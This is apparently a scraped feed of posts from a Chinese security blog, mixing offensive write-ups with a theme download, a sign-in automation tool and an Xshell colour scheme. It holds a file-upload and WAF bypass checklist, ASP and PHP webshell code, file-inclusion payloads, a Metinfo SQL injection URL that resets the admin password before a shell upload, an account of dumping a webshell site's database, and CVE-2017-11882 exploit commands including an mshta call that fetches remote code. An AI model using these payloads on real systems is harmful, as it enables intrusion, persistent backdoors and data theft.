总结\"></a>0x06 总结</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div></pre></td><td class=\"code\"><pre><div class=\"line\">[*] filename在content-type下面</div><div class=\"line\">[*] .asp&#123;80-90&#125;</div><div class=\"line\">[*] NTFS ADS</div><div class=\"line\">[*] .asp...</div><div class=\"line\">[*] boundary不一致</div><div class=\"line\">[*] iis6分号截断asp.asp;asp.jpg</div><div class=\"line\">[*] apache解析漏洞php.php.ddd</div><div class=\"line\">[*] boundary和content-disposition中间插入换行</div><div class=\"line\">[*] hello.php:a.jpg然后hello.&lt;&lt;&lt;</div><div class=\"line\">[*] filename=php.php</div><div class=\"line\">[*] filename=&quot;a.txt&quot;;filename=&quot;a.php&quot;</div><div class=\"line\">[*] name=\\n&quot;file&quot;;filename=&quot;a.php&quot;</div><div class=\"line\">[*] content-disposition:\\n</div><div class=\"line\">[*] .htaccess文件</div><div class=\"line\">[*] a.jpg.\\nphp</div><div class=\"line\">[*] 去掉content-disposition的form-data字段</div><div class=\"line\">[*] php&lt;5.3 单双引号截断特性</div><div class=\"line\">[*] 删掉content-disposition: form-data;</div><div class=\"line\">[*] content-disposition\\00:</div><div class=\"line\">[*] &#123;char&#125;+content-disposition</div><div class=\"line\">[*] head头的content-type: tab</div><div class=\"line\">[*] head头的content-type: multipart/form-DATA</div><div class=\"line\">[*] filename后缀改为大写</div><div class=\"line\">[*] head头的Content-Type: multipart/form-data;\\n</div><div class=\"line\">[*] .asp空格</div><div class=\"line\">[*] .asp0x00.jpg截断</div><div class=\"line\">[*] 双boundary</div><div class=\"line\">[*] file\\nname=&quot;php.php&quot;</div><div class=\"line\">[*] head头content-type空格:</div><div class=\"line\">[*] form-data字段与name字段交换位置</div></pre></td></tr></table></figure>\n<h1 id=\"0x07-针对云WAF\"><a href=\"#0x07-针对云WAF\" class=\"headerlink\" title=\"0x07 针对云WAF\"></a>0x07 针对云WAF</h1><ul>\n<li>不要相信Demo的规则</li>\n<li>多收集例站进行站点随机Fuzz，建议至少50+</li>\n<li>针对IPS／IDS</li>\n<li>尽可能先拿到早版本的交互层代码</li>\n<li>扫其服务测其EXP</li>\n<li>针对主机防护软件</li>\n<li>WAF就在眼前，Rule我想去猜猜</li>\n<li>懂逆向则逆向，不懂逆向就瞎Fuzz，内存泄露、dll劫持使劲怼，crash了最好。</li>\n</ul>\n<h1 id=\"0x08-其他\"><a href=\"#0x08-其他\" class=\"headerlink\" title=\"0x08 其他\"></a>0x08 其他</h1><p><strong>ashx写asp的一句话</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;%@ WebHandler Language=&quot;C#&quot;Class=&quot;Handler&quot; %&gt;</div><div class=\"line\">using System;</div><div class=\"line\">using System.Web;</div><div class=\"line\">using System.IO;</div><div class=\"line\">public class Handler : IHttpHandler &#123;</div><div class=\"line\">public void ProcessRequest (HttpContext context) &#123;</div><div class=\"line\">context.Response.ContentType = &quot;text/plain&quot;;</div><div class=\"line\">StreamWriter file1= File.CreateText(context.Server.MapPath(&quot;root.asp&quot;));</div><div class=\"line\">file1.Write(&quot;&lt;%response.clear:execute request(\\&quot;root\\&quot;):response.End%&gt;&quot;);</div><div class=\"line\">file1.Flush();</div><div class=\"line\">file1.Close();</div><div class=\"line\">&#125;</div><div class=\"line\">public bool IsReusable &#123;</div><div class=\"line\">get &#123;</div><div class=\"line\">return false;</div><div class=\"line\">&#125;</div><div class=\"line\">&#125;</div><div class=\"line\">&#125;</div><div class=\"line\">%&gt;</div></pre></td></tr></table></figure></p>\n<p><strong>文件包含</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div></pre></td><td class=\"code\"><pre><div class=\"line\">一 </div><div class=\"line\">    &lt;?php include ($_GET[&apos;cmd&apos;]);?&gt;         include.php </div><div class=\"line\">    &lt;?php @eval($_POST[1]);?&gt;               1.txt </div><div class=\"line\">        include.php?cmd=1.txt               菜刀连接</div><div class=\"line\">    &lt;?php fputs(fopen(&apos;cmd.php&apos;,&apos;w&apos;),&apos;&lt;?php @eval($_POST[1]);?&gt;&apos;)?&gt;  2.txt</div><div class=\"line\">        include.php?cmd=2.txt               生成cmd.php</div><div class=\"line\">    include.php?cmd=data:text/plain,&lt;?php fputs(fopen(&apos;cmd1.php&apos;,&apos;w&apos;),&apos;&lt;?php @eval($_POST[1]);?&gt;&apos;)?&gt;                 协议生成cmd1.php</div><div class=\"line\">二 </div><div class=\"line\"> </div><div class=\"line\">    &lt;?php Include(&quot;上传的txt文件路径&quot;);?&gt;              #PHP   </div><div class=\"line\">    &lt;!--#include file=&quot;上传的txt文件路径&quot; --&gt;          #ASP    </div><div class=\"line\">    &lt;!--#include file=&quot;上传的txt文件路径&quot; --&gt;          #ASPX   </div><div class=\"line\">    &lt;jsp:inclde page=&quot;上传的txt文件路径&quot;/&gt;             #JSP    </div><div class=\"line\">    &lt;%@include file=&quot;上传的txt文件路径&quot;%&gt;</div><div class=\"line\">    &lt;c:import url=&quot;上传的txt文件路径&quot;&gt;                 #JSTL</div><div class=\"line\">三  &lt;?php include &apos;phar://1.rar/1.txt&apos;;?&gt;       访问后再访问/1/1.txt即可</div></pre></td></tr></table></figure></p>\n<p><a href=\"https://navisec.it/%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%89%8B%E5%86%8C/\" target=\"_blank\" rel=\"external\">编辑器绕过</a></p>\n<p>下载地址:<br><a href=\"http://oq4ris5sp.bkt.clouddn.com/editor1.pdf\" target=\"_blank\" rel=\"external\">PDF1下载</a><br><a href=\"http://oq4ris5sp.bkt.clouddn.com/editor.pdf\" target=\"_blank\" rel=\"external\">PDF2下载</a>  </p>\n<p>其他资料:<br><a href=\"http://cracer.com/?p=350\" target=\"_blank\" rel=\"external\">绕waf资料</a><br><a href=\"http://www.freebuf.com/articles/web/18084.html\" target=\"_blank\" rel=\"external\">WAF基础了解</a><br><a href=\"http://blog.csdn.net/u011066706/article/details/51175401?locationNum=11\" target=\"_blank\" rel=\"external\">NTFS-ADS流文件</a><br><a href=\"http://www.cnnetarmy.com/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/\" target=\"_blank\" rel=\"external\">文件上传绕过姿势总结</a>  </p>\n","categories":[],"tags":[]},{"title":"WP主题：DUX3.0&2.0主题开心版","url":"http://www.chabug.org/2017/12/23/dux3-and-2/","content":"<p><img src=\"https://ws2.sinaimg.cn/mw690/7efa749fly1fmn5apzu1ej20mg0alq56.jpg\" alt=\"\"><br><strong>DUX主题更新方法</strong></p>\n<p>主题更新方法：</p>\n<p>使用FTP软件上传 dux文件夹到服务器的 wp-content/themes 目录下，替换所有文件即可。</p>\n<p>注：使用此方法更新主题会保留网站之前的 dux主题设置。</p>\n<p><strong>DUX主题更新记录</strong></p>\n<p>DUX主题3.0版本更新内容：</p>\n<ul>\n<li><p>全新的标签云（tags）页面</p>\n</li>\n<li><p>新增分类的SEO标题、SEO关键字和SEO描述</p>\n</li>\n<li><p>新增聚合文章小工具按浏览量排序的文章展示</p>\n</li>\n<li><p>新增链接分类可排序，按别名字母或数字从小到大排序，适用于主题中所有的链接调取</p>\n</li>\n<li><p>新增链接可排序，按评分从高到低排序，适用于主题中所有的链接调取</p>\n</li>\n<li><p>新增对WP4.8+小工具文本的可视化展示支持</p>\n</li>\n<li><p>新增对WP4.8+小工具音频、视频、图像的支持</p>\n</li>\n<li><p>修改站点设置中副标题为空时只显示站点标题</p>\n</li>\n<li><p>修改文章和页面的自动描述（description）字数限制为200</p>\n</li>\n<li><p>修改标签页面的描述（description）为标签的图像描述</p>\n</li>\n<li><p>解决找回密码页面下拉可能发生的页面抖动</p>\n</li>\n<li><p>解决主题设置中图片地址参数被过滤的问题</p>\n</li>\n<li><p>解决搜索页面搜索框不显示的问题</p>\n</li>\n<li><p>去除主题设置中的360公共资源库引用</p>\n</li>\n<li><p>修改图片lazyload缩略图的判断方式</p>\n</li>\n<li><p>其他小问题的修复</p>\n</li>\n</ul>\n<p><strong>下载地址</strong></p>\n<p>3.0版本下载地址：<a href=\"https://pan.baidu.com/s/1o8IGgrS\" target=\"_blank\" rel=\"external\">https://pan.baidu.com/s/1o8IGgrS</a>    3.0版本密码：15d3</p>\n<p>2.0版本下载地址：<a href=\"https://pan.baidu.com/s/1pKKzyrh\" target=\"_blank\" rel=\"external\">https://pan.baidu.com/s/1pKKzyrh</a>    2.0版本密码：yfnj</p>\n<p><strong>注意事项：<br>大前端Dux3.0主题，来源网络，经本站认真测试功能完整无任何限制，无任何后门或者恶意代码。<br>再次申明：经本站下载的主题都是用来学习研究用，如需商用请购买正版！</strong></p>\n","categories":[],"tags":[]},{"title":"看我如何搞掉国内最大的webshell箱子","url":"http://www.chabug.org/2017/12/16/hack-webshellbox-mumaasp/","content":"<p>好像是最大的 管它呢</p>\n<p>先下载它的一个asp大马.<br><img src=\"http://ww1.sinaimg.cn/large/006xriynly1fmppf4go55j31400dp75l.jpg\" alt=\"\"><br>放入wwwroot netbox 启动<br><img src=\"http://ww1.sinaimg.cn/large/006xriynly1fmppf4edawj30go02rgll.jpg\" alt=\"\"><br>抓包分析<br><img src=\"http://ww1.sinaimg.cn/large/006xriynly1fmppf4jwkqj31gt06l0ub.jpg\" alt=\"\"><br><code>http://www.mumaasp.com/xz/sx.asp?u=127.0.0.1:81/Asp%C3%E2%C9%B1%B4%F3%C2%ED.asp&amp;p=mumaasp.com</code></p>\n<p>u 为网站地址 p为shell密码</p>\n<p>本来想插xss的 不过手贱打开看了一下<br><img src=\"http://ww1.sinaimg.cn/large/006xriynly1fmppf4eepuj30gk06o0sy.jpg\" alt=\"\"><br>源码直接爆出来了 其中有Checkxss函数</p>\n<p>可以进行代码审计 不过再往下翻看看?<br><img src=\"http://ww1.sinaimg.cn/large/006xriynly1fmppf4fqahj30hs06eglu.jpg\" alt=\"\"><br><code>^%$@#!!!858879018!@#.mdb</code></p>\n<p>数据库名称</p>\n<p>url编码</p>\n<p><code>%5E%25%24%40%23%21%21%21%38%35%38%38%37%39%30%31%38%21%40%23%2E%6D%64%62</code></p>\n<p>访问<br><img src=\"http://ww1.sinaimg.cn/large/006xriynly1fmppf4eh75j30cg05t74e.jpg\" alt=\"\"><br>88745条  </p>\n<p><img src=\"http://ww1.sinaimg.cn/large/006xriynly1fmppf4dql4j303j00r0n5.jpg\" alt=\"\"><br>惊不惊喜 意不意外<br><code>裤子就不放出来了。</code></p>\n","categories":[],"tags":[]},{"title":"记一次Metinfo渗透","url":"http://www.chabug.org/2017/12/16/metinfo-test/","content":"<p>全文转自<a href=\"http://exp10it.tk/index.php/archives/163/\" target=\"_blank\" rel=\"external\">X1r0z</a><br>目标站</p>\n<p>php + mysql + iis6 + 2003</p>\n<p>查看一下robots.txt<br><img src=\"http://ww1.sinaimg.cn/large/006xriynly1fmppjzfvp2j30i50d0t9f.jpg\" alt=\"\"><br>访问 /admin</p>\n<p>登录框输入单引号 没报错</p>\n<p>查看网站title才发现这是metinfo的<br><img src=\"http://ww1.sinaimg.cn/large/006xriynly1fmppjzdmg2j30sr0didga.jpg\" alt=\"\"></p>\n<p>搜索了一下metinfo的最新漏洞</p>\n<p>metinfo 5.3.1 注入漏洞 + 后台getshell</p>\n<p>直接访问</p>\n<p><code>/admin/login/login_check.php?met_cookie_filter[a]=a%27,admin_pass=md5(1234567)+where+id=1;+%23--</code></p>\n<p>将admin密码改成1234567</p>\n<p>感觉有点暴力= =</p>\n<p>成功登录后台<br><img src=\"http://ww1.sinaimg.cn/large/006xriynly1fmppjzcva6j30uq0hgt9f.jpg\" alt=\"\"><br>在文章那里找到上传点<br><img src=\"http://ww1.sinaimg.cn/large/006xriynly1fmppjzcxxyj30d50hm3zi.jpg\" alt=\"\"><br>CKFinder<br><img src=\"http://ww1.sinaimg.cn/large/006xriynly1fmppjzcj2gj30qz052mxc.jpg\" alt=\"\"><br>服务器是iis6的 可以直接用解析漏洞</p>\n<p>这里的CKFinder不能重命名</p>\n<p>直接创建a.asp文件夹 上传一句话<br><img src=\"http://ww1.sinaimg.cn/large/006xriynly1fmppjzd1f2j30cs068glm.jpg\" alt=\"\"><br><img src=\"http://ww1.sinaimg.cn/large/006xriynly1fmppjzgyc6j30lt07ft8w.jpg\" alt=\"\"></p>\n","categories":[],"tags":[]},{"title":"分享一个可以用模板的自动签到系统🙄","url":"http://www.chabug.org/2017/11/23/qiandao-today/","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>常常混迹各大论坛和剁手网站的小伙伴们，各大网站为了蚕食我们的时间，基本都是有推出了每日签到的系统，比如JD豆，经验值，金币，积分等等。。。并且很多必须还要连续不间断签到才能获得更高的奖励。🤢  </p>\n<p>然而平常稍微忙一点的话，一下子就前功尽弃了。 🙃</p>\n<p>所以一个叫签到.TODAY的项目诞生了。  </p>\n<h1 id=\"项目地址\"><a href=\"#项目地址\" class=\"headerlink\" title=\"项目地址\"></a>项目地址</h1><p><a href=\"https://github.com/binux/qiandao\" target=\"_blank\" rel=\"external\">binux/qiandao</a></p>\n<h1 id=\"项目演示\"><a href=\"#项目演示\" class=\"headerlink\" title=\"项目演示\"></a>项目演示</h1><p><a href=\"https://qiandao.today/\" target=\"_blank\" rel=\"external\">QIANDAO.TODAY</a></p>\n<p>演示网站是作者自己开的，里面可以注册帐号并且直接可以使用搭建好的签到系统。🤔</p>\n<p>当然若是害怕隐私被泄露的话，也建议自己在GITHUB中下载源码自行部署🙃</p>\n<h1 id=\"如何使用\"><a href=\"#如何使用\" class=\"headerlink\" title=\"如何使用\"></a>如何使用</h1><p>签到模板基本上分成三大类：</p>\n<ul>\n<li><p>直接账号密码签到<br>直接使用要签到网站的帐号密码来签到。</p>\n</li>\n<li><p>PC网页端COOKIES签到<br>在Chrome中使用<a href=\"https://github.com/acgotaku/GetCookies\" target=\"_blank\" rel=\"external\">Cookies获取助手</a>自动抓取Cookies，在签到面板中可以直接一键获取需要的Cookies来签到。</p>\n</li>\n<li><p>移动设备端COOKIES签到<br>PC上使用软件Fiddler来抓取移动设备签到时的Cookies，再填入签到面板的Cookies栏来签到。</p>\n</li>\n</ul>\n<h1 id=\"如何安装\"><a href=\"#如何安装\" class=\"headerlink\" title=\"如何安装\"></a>如何安装</h1><h2 id=\"Web\"><a href=\"#Web\" class=\"headerlink\" title=\"Web\"></a>Web</h2><p>需要 python2.7, <strong>虚拟主机无法安装</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">apt-get install python-dev autoconf g++ python-pbkdf2</div><div class=\"line\">pip install tornado u-msgpack-python jinja2 chardet requests pbkdf2 pycrypto</div></pre></td></tr></table></figure></p>\n<p>可选 redis, Mysql</p>\n<p><code>mysql &lt; qiandao.sql</code></p>\n<p>启动</p>\n<p><code>./run.py</code><br>去 <a href=\"https://qiandao.today/tpls/public\" target=\"_blank\" rel=\"external\">https://qiandao.today/tpls/public</a> 查看你需要的模板，点击下载。 在你自己的主页中 <code>「我的模板+」</code> 点击 + <code>上传</code>。模板需要发布才会在<code>「公开模板」</code>中展示，你需要管理员权限在<code>「我的发布请求」</code>中审批通过。</p>\n<p>设置管理员</p>\n<p><code>./chrole.py your@email.address admin</code></p>\n<h2 id=\"使用Docker部署站点\"><a href=\"#使用Docker部署站点\" class=\"headerlink\" title=\"使用Docker部署站点\"></a>使用Docker部署站点</h2><p>可参考 <a href=\"https://github.com/binux/qiandao/wiki/Docker%E9%83%A8%E7%BD%B2%E7%AD%BE%E5%88%B0%E7%AB%99%E6%95%99%E7%A8%8B\" target=\"_blank\" rel=\"external\">Wiki Docker部署签到站教程</a></p>\n<hr>\n<p>qiandao.py</p>\n<hr>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">pip install tornado u-msgpack-python jinja2 chardet requests</div><div class=\"line\">./qiandao.py tpl.har [--key=value]* [env.json]</div></pre></td></tr></table></figure>\n<hr>\n<p>config.py</p>\n<hr>\n<p>优先用<code>mailgun</code>方式发送邮件，如果要用smtp方式发送邮件，请填写<code>mail_smtp</code>, <code>mail_user</code>, <code>mail_password</code><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">mail_smtp = &quot;&quot;     # 邮件smtp 地址</div><div class=\"line\">mail_user = &quot;&quot;    # 邮件账户</div><div class=\"line\">mail_passowrd = &quot;&quot;   # 邮件密码</div><div class=\"line\">mail_domain = &quot;mail.qiandao.today&quot;</div><div class=\"line\">mailgun_key = &quot;&quot;</div></pre></td></tr></table></figure></p>\n<h1 id=\"如何创建签到模板\"><a href=\"#如何创建签到模板\" class=\"headerlink\" title=\"如何创建签到模板\"></a>如何创建签到模板</h1><p><a href=\"https://github.com/binux/qiandao/blob/master/docs/har-howto.md\" target=\"_blank\" rel=\"external\">参考此开发文档</a>😋</p>\n","categories":[],"tags":[]},{"title":"对于CVE-2017-11882的利用","url":"http://www.chabug.org/2017/11/23/CVE-2017-11882/","content":"<p>最近这段时间CVE-2017-11882挺火的。关于这个漏洞可以看看这里:<a href=\"http://www.freebuf.com/vuls/154462.html\" target=\"_blank\" rel=\"external\">隐藏17年的Office远程代码执行漏洞POC样本分析（CVE-2017-11882)</a>。</p>\n<p>今天在twitter上看到有人共享了一个POC，<a href=\"https://twitter.com/gossithedog/status/932694287480913920\" target=\"_blank\" rel=\"external\">twitter地址</a>，<a href=\"http://owned.lab6.com/~gossi/research/public/cve-2017-11882/\" target=\"_blank\" rel=\"external\">Poc地址</a>，后来又看到有人共享了一个项目<a href=\"https://github.com/embedi/CVE-2017-11882\" target=\"_blank\" rel=\"external\">CVE-2017-11882</a>，简单看了一下这个项目，通过对rtf文件的修改来实现命令执行的目的，但是有个缺陷就是，这个项目使用的是使用webdav的方式来执行远程文件的，使用起来可能并不容易。<br>然后在GitHub上又找到了一个，<a href=\"https://github.com/Ridter/CVE-2017-11882/\" target=\"_blank\" rel=\"external\">项目地址</a>。<br>使用方式很简单，如果要执行命令</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">python Command_CVE<span class=\"number\">-2017</span><span class=\"number\">-11882.</span>py -c <span class=\"string\">\"cmd.exe /c calc.exe\"</span> -o test.doc</div></pre></td></tr></table></figure>\n<p>demo<br><img src=\"http://ww1.sinaimg.cn/large/006xriynly1flrziofcqgg30w40hznpd.gif\" alt=\"\"></p>\n<p>进一步利用，由于有长度的限制，这里可以采用mshta的方式来执行。构造的命令如下：<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">python Command_CVE<span class=\"number\">-2017</span><span class=\"number\">-11882.</span>py -c <span class=\"string\">\"mshta http://site.com/abc\"</span> -o test.doc</div></pre></td></tr></table></figure></p>\n<p>最终效果如下：<br><img src=\"http://ww1.sinaimg.cn/large/006xriynly1flrzkkb094g30w40hzwtb.gif\" alt=\"\"><br>解决方案：</p>\n<p>1、微软已经对此漏洞做出了修复。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">下载https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-11882  更新补丁进行修补</div><div class=\"line\">开启Windows Update功能，定期对系统进行自动更新</div></pre></td></tr></table></figure></p>\n<p>由于该公式编辑器已经17年未做更新，可能存在大量安全漏洞，建议在注册表中取消该模块的注册。</p>\n<p>按下Win+R组合键，打开cmd.exe</p>\n<p>对应office版本修改以下注册表路径以后，输入：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">reg add &quot;HKLM\\SOFTWARE\\Microsoft\\Office\\XX.X\\Common\\COM Compatibility\\&#123;0002CE02-0000- 0000-C000-000000000046&#125;&quot; /v &quot;Compatibility Flags&quot; /t REG_DWORD /d 0x400</div><div class=\"line\"></div><div class=\"line\">reg add &quot;HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Office\\XX.X\\Common\\COM Compatibility\\&#123;0002CE02-0000-0000-C000-000000000046&#125;&quot; /v &quot;Compatibility Flags&quot; /t REG_DWORD /d 0x400</div><div class=\"line\">office</div></pre></td></tr></table></figure></p>\n","categories":[],"tags":[]},{"title":"贼好看之Xshell5的配色方案monokai","url":"http://www.chabug.org/2017/11/21/xshell-color/","content":"<p>xshell5默认的配色方案不是很好看，有点伤眼睛，网上也有很多xshell的配色方案，但都感觉不是很满意。<br>最近找到一个monokai的配色方案，配合vim的molokai主题，简直不要太爽!</p>\n<h1 id=\"新建文件monokai-xcs\"><a href=\"#新建文件monokai-xcs\" class=\"headerlink\" title=\"新建文件monokai.xcs\"></a>新建文件monokai.xcs</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div></pre></td><td class=\"code\"><pre><div class=\"line\">[monokai]</div><div class=\"line\">text=ffffff</div><div class=\"line\">cyan(bold)=a6e22e</div><div class=\"line\">text(bold)=ffffff</div><div class=\"line\">magenta=f92672</div><div class=\"line\">green=80ff80</div><div class=\"line\">green(bold)=80ff80</div><div class=\"line\">background=272822</div><div class=\"line\">cyan=a6e22e</div><div class=\"line\">red(bold)=de8e30</div><div class=\"line\">yellow=66d9ef</div><div class=\"line\">magenta(bold)=f92672</div><div class=\"line\">yellow(bold)=66d9ef</div><div class=\"line\">red=de8e30</div><div class=\"line\">white=c0c0c0</div><div class=\"line\">blue(bold)=ae81ff</div><div class=\"line\">white(bold)=ffffff</div><div class=\"line\">black=000000</div><div class=\"line\">blue=ae81ff</div><div class=\"line\">black(bold)=000000</div><div class=\"line\">[Names]</div><div class=\"line\">name0=monokai</div><div class=\"line\">count=1</div></pre></td></tr></table></figure>\n<h1 id=\"导入monokai-xcs\"><a href=\"#导入monokai-xcs\" class=\"headerlink\" title=\"导入monokai.xcs\"></a>导入monokai.xcs</h1><p>Xshell5 -&gt; 工具 -&gt; 配色方案 -&gt; 导入monokai.xcs<br>上图<br><img src=\"http://ww1.sinaimg.cn/large/006xriynly1flprkuli4uj311g0i2ab8.jpg\" alt=\"\"></p>\n","categories":[],"tags":[]},{"title":"WordPress（4.8.2及以下版本） SQL注入利用漏洞","url":"http://www.chabug.org/2017/11/21/WordPress4-82-sql/","content":"<p>WordPress中的<code>POST META</code>为文章的自定义栏目/字段，就如一篇文章中会有标题、作者等字段，但是对于有些主题/插件来说，文章中的自有字段显得不够用，就需要用到自定义栏目/字段。</p>\n<p>（该操作的位置在添加/编辑文章，在文本编辑框下方的自定义栏目，如果没有找到自定义栏目，需要在右上角的显示选项内将自定义栏目勾选。）</p>\n<p>自定义栏目/字段的数据以<code>meta_key</code>（字段/栏目名）-&gt;<code>meta_value</code>（值）的形式存放在wp_postmeta表内。以下划线开头的<code>meta_key</code>（字段/栏目名）被认为是保留字段，不允许用户添加。</p>\n<p>本文将介绍如何绕过Wordpress的<code>meta_key</code>检查，添加字段/栏目名以下划线开头的自定义栏目/字段。</p>\n<h1 id=\"第一章-WordPress-≤-4-7-4-XML-RPC-API-POST-META-未校验漏洞\"><a href=\"#第一章-WordPress-≤-4-7-4-XML-RPC-API-POST-META-未校验漏洞\" class=\"headerlink\" title=\"第一章 WordPress ≤ 4.7.4 XML-RPC API POST META 未校验漏洞\"></a>第一章 WordPress ≤ 4.7.4 XML-RPC API POST META 未校验漏洞</h1><p>参考内容：<a href=\"https://wordpress.org/news/2017/05/wordpress-4-7-5/\" target=\"_blank\" rel=\"external\">WordPress 4.7.5 Security and Maintenance Release</a></p>\n<h4 id=\"1-1-POC\"><a href=\"#1-1-POC\" class=\"headerlink\" title=\"1.1 POC\"></a>1.1 POC</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">$usr = ‘author’;$pwd = ‘author’;$xmlrpc = ‘http://local.target/xmlrpc.php‘;$client = new IXR_Client($xmlrpc);$content = array(“ID” =&gt; 6, ‘meta_input’ =&gt; array(“_thumbnail_id”=&gt;”xxx”));$res = $client-&gt;query(‘wp.editPost’,0, $usr, $pwd, 6/post_id/, $content);</div></pre></td></tr></table></figure>\n<p>POC来自 <a href=\"https://medium.com/websec/wordpress-sqli-poc-f1827c20bf8e\" target=\"_blank\" rel=\"external\">WordPress SQLi — PoC by slavco</a></p>\n<h4 id=\"1-2-漏洞分析\"><a href=\"#1-2-漏洞分析\" class=\"headerlink\" title=\"1.2 漏洞分析\"></a>1.2 漏洞分析</h4><p>补丁位置：<a href=\"https://github.com/WordPress/WordPress/commit/e88a48a066ab2200ce3091b131d43e2fab2460a4#diff-6a81e4b18bb9bfe1f02588ddc35d801b\" target=\"_blank\" rel=\"external\"><code>wp-includes/class-wp-xmlrpc-server.php</code></a></p>\n\n<p>根据补丁的内容，是将传入的$content_struct内容进行了白名单限制，同时也过滤了POC中的<code>meta_input</code>。</p>\n<p>1.先看修复后的_insert_post函数中我们关注代码（文件：<a href=\"https://github.com/WordPress/WordPress/blob/e88a48a066ab2200ce3091b131d43e2fab2460a4/wp-includes/class-wp-xmlrpc-server.php#L1297\" target=\"_blank\" rel=\"external\">wp-includes/class-wp-xmlrpc-server.php</a>）<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div></pre></td><td class=\"code\"><pre><div class=\"line\">protected function _insert_post( $user, $content_struct ) &#123;</div><div class=\"line\">    $defaults = array(</div><div class=\"line\">        ...//ignore</div><div class=\"line\">        &apos;custom_fields&apos;  =&gt; null,</div><div class=\"line\">        &apos;terms_names&apos;    =&gt; null,</div><div class=\"line\">        &apos;terms&apos;          =&gt; null,</div><div class=\"line\">        &apos;sticky&apos;         =&gt; null,</div><div class=\"line\">        &apos;enclosure&apos;      =&gt; null,</div><div class=\"line\">        &apos;ID&apos;             =&gt; null,</div><div class=\"line\">    );</div><div class=\"line\">    $post_data = wp_parse_args( array_intersect_key( $content_struct, $defaults ), $defaults );</div><div class=\"line\">    ...//ignore</div><div class=\"line\">    if ( isset( $post_data[&apos;custom_fields&apos;] ) )</div><div class=\"line\">        $this-&gt;set_custom_fields( $post_ID, $post_data[&apos;custom_fields&apos;] );</div><div class=\"line\">    ...//ignore</div><div class=\"line\">    $post_ID = $update ? wp_update_post( $post_data, true ) : wp_insert_post( $post_data, true );</div><div class=\"line\">    if ( is_wp_error( $post_ID ) )</div><div class=\"line\">        return new IXR_Error( 